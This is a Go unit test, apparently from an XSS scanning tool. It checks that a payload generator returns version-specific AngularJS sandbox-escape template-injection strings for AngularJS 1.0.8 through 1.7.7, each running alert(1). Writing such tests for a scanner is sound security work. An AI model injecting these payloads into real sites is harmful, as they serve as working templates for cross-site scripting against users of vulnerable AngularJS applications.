package payloads

import (
	"testing"

	"github.com/lcalzada-xor/xxss/v3/pkg/models"
	"github.com/lcalzada-xor/xxss/v3/pkg/scanner/technologies"
)

func TestAngularVersionPayloads(t *testing.T) {
	allowed := []string{".", "(", ")", "'", "{", "}", "[", "]"}
	// Test cases
	tests := []struct {
		version  string
		expected string
	}{
		{"1.6.0", "{{$on.constructor('alert(1)')()}}"},
		{"1.7.7", "{{$on.constructor('alert(1)')()}}"},
		{"1.5.8", "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}"},
		{"1.4.9", "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"},
		{"1.3.20", "{{!ready && (ready = true) && (on = {}.constructor.prototype) && (on.constructor.prototype = null) && (on.constructor = [].pop.constructor) && on.constructor('alert(1)')()}}"},
		{"1.2.29", "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"},
		{"1.0.8", "{{constructor.constructor('alert(1)')()}}"},
	}

	for _, tt := range tests {
		t.Run("Angular "+tt.version, func(t *testing.T) {
			techs := []*technologies.Technology{
				{
					Name:    "AngularJS",
					Version: tt.version,
				},
			}
			payload := GenerateReflectedPayload(models.ContextAngular, allowed, techs)
			if payload != tt.expected {
				t.Errorf("Version %s: expected %s, got %s", tt.version, tt.expected, payload)
			}
		})
	}
}
